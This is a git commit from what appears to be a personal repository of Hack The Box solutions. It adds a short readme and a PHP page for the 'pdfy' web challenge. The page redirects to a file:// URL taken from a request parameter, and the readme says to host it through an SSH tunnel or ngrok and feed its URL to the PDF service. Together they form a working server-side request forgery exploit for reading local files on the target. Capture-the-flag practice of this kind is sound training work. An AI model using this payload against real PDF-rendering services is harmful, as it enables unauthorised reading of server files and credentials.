14588eab9e9aa35262a57b3999231dba3ae39ec5
Gianluca Massara <gianluca.massara99@gmail.com>
2024-04-27 21:27:15 +0200

    update

---
+++ hack_the_box/htb_challenges/web/pdfy/readme.txt
@@ -0,0 +1,1 @@
+host the folder on a php server with a ssh tunnel (or ngrok) and input the url into the pdfy webapp
---
+++ hack_the_box/htb_challenges/web/pdfy/site.php
@@ -0,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>PHP Test</title>
+    </head>
+    <body>
+     <?php header('location:file://'.$_REQUEST['x']); ?>
+    </body>
+</html>
